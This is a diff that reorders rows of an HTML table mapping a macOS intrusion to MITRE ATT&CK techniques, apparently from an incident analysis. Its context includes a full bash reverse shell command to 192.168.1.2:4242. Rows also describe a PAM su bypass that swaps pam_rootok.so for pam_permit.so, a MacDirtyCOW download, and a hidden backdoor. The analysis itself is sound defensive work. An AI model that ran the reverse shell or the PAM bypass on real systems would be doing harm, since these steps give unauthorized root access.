@@ -650,6 +650,13 @@ flowchart TD
       <td style="border: 1px solid #444444; padding: 10px; text-align: left;">The initial payload executed a bash reverse shell via /bin/bash -l &gt; /dev/tcp/192.168.1.2/4242 0&lt;&amp;1 2&gt;&amp;1.</td>
     </tr>
     <tr>
+      <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Command and Control</td>
+      <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Non-Application Layer Protocol</td>
+      <td style="border: 1px solid #444444; padding: 10px; text-align: center;">T1095</td>
+      <td style="border: 1px solid #444444; padding: 10px; text-align: left;">The initial reverse shell payload communicated over a raw TCP socket (/dev/tcp/192.168.1.2/4242) rather than standard HTTP/DNS protocols.</td>
+    </tr>
+
+    <tr>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Defense Evasion</td>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Subvert Trust Controls: Gatekeeper Bypass</td>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">T1553.001</td>
@@ -661,12 +668,20 @@ flowchart TD
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">T1105</td>
       <td style="border: 1px solid #444444; padding: 10px; text-align: left;">The attacker abused curl to download race.zip (containing the MacDirtyCOW exploit) from their C2 server.</td>
     </tr>
+
     <tr>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Privilege Escalation</td>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Exploitation for Privilege Escalation</td>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">T1068</td>
       <td style="border: 1px solid #444444; padding: 10px; text-align: left;">The attacker crafted and ran expooo to exploit the MacDirtyCOW vulnerability (CVE-2022-46689) and overwrite the PAM configuration.</td>
     </tr>
+    <tr>
+      <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Credential Access / Defense Evasion</td>
+      <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Modify Authentication Process: Pluggable Authentication Modules</td>
+      <td style="border: 1px solid #444444; padding: 10px; text-align: center;">T1556.003</td>
+      <td style="border: 1px solid #444444; padding: 10px; text-align: left;">The attacker modified the macOS PAM configuration file for 'su' (replacing 'pam_rootok.so' with 'pam_permit.so') to bypass password verification and gain a root shell.</td>
+    </tr>
+
     <tr>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Persistence</td>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Create Account: Local Account</td>
@@ -680,6 +695,19 @@ flowchart TD
       <td style="border: 1px solid #444444; padding: 10px; text-align: left;">The attacker enabled the com.openssh.sshd service and successfully established an SSH connection to the machine.</td>
     </tr>
     <tr>
+      <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Persistence / Privilege Escalation</td>
+      <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Valid Accounts: Local Accounts</td>
+      <td style="border: 1px solid #444444; padding: 10px; text-align: center;">T1078.003</td>
+      <td style="border: 1px solid #444444; padding: 10px; text-align: left;">The attacker utilized the newly created backdoor account 'loki' to legitimately log into the system via SSH, bypassing normal anomaly detections.</td>
+    </tr>
+
+    <tr>
+      <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Defense Evasion</td>
+      <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Hide Artifacts: Hidden Files and Directories</td>
+      <td style="border: 1px solid #444444; padding: 10px; text-align: center;">T1564.001</td>
+      <td style="border: 1px solid #444444; padding: 10px; text-align: left;">The attacker concealed the final Demsty backdoor executable inside a hidden Unix directory path (/Users/loki/.local/bin/sysetmd).</td>
+    </tr>
+    <tr>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Persistence</td>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Create or Modify System Process: Launch Agent</td>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">T1543.001</td>
@@ -690,30 +718,6 @@ flowchart TD
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Masquerading: Match Legitimate Name or Location</td>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">T1036.005</td>
       <td style="border: 1px solid #444444; padding: 10px; text-align: left;">The attacker used typosquatting names like appule (Apple) and sysetmd (systemd) for the LaunchAgent to hide in plain sight.</td>
-    </tr>
-    <tr>
-      <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Credential Access / Defense Evasion</td>
-      <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Modify Authentication Process: Pluggable Authentication Modules</td>
-      <td style="border: 1px solid #444444; padding: 10px; text-align: center;">T1556.003</td>
-      <td style="border: 1px solid #444444; padding: 10px; text-align: left;">The attacker modified the macOS PAM configuration file for 'su' (replacing 'pam_rootok.so' with 'pam_permit.so') to bypass password verification and gain a root shell.</td>
-    </tr>
-    <tr>
-      <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Persistence / Privilege Escalation</td>
-      <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Valid Accounts: Local Accounts</td>
-      <td style="border: 1px solid #444444; padding: 10px; text-align: center;">T1078.003</td>
-      <td style="border: 1px solid #444444; padding: 10px; text-align: left;">The attacker utilized the newly created backdoor account 'loki' to legitimately log into the system via SSH, bypassing normal anomaly detections.</td>
-    </tr>
-    <tr>
-      <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Command and Control</td>
-      <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Non-Application Layer Protocol</td>
-      <td style="border: 1px solid #444444; padding: 10px; text-align: center;">T1095</td>
-      <td style="border: 1px solid #444444; padding: 10px; text-align: left;">The initial reverse shell payload communicated over a raw TCP socket (/dev/tcp/192.168.1.2/4242) rather than standard HTTP/DNS protocols.</td>
-    </tr>
-    <tr>
-      <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Defense Evasion</td>
-      <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Hide Artifacts: Hidden Files and Directories</td>
-      <td style="border: 1px solid #444444; padding: 10px; text-align: center;">T1564.001</td>
-      <td style="border: 1px solid #444444; padding: 10px; text-align: left;">The attacker concealed the final Demsty backdoor executable inside a hidden Unix directory path (/Users/loki/.local/bin/sysetmd).</td>
     </tr>
     <tr>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Discovery</td>
